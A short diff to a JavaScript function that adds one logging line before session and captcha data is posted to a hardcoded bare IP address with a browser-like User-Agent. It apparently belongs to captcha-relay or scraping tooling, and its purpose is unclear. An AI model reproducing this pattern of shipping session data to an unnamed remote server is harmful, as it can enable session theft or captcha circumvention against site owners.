@@ -236,7 +236,7 @@ async function sendToMainServer(session) {
         message: { sessionId, id: sessionId, url: captchaUrl, body: bodyData },
         FileName: "Captchas"
     };
-
+    console.log(payload);
     const response = await axios.post("http://91.98.162.218/upload", payload, {
         timeout: 15000,
         headers: { "User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json" }
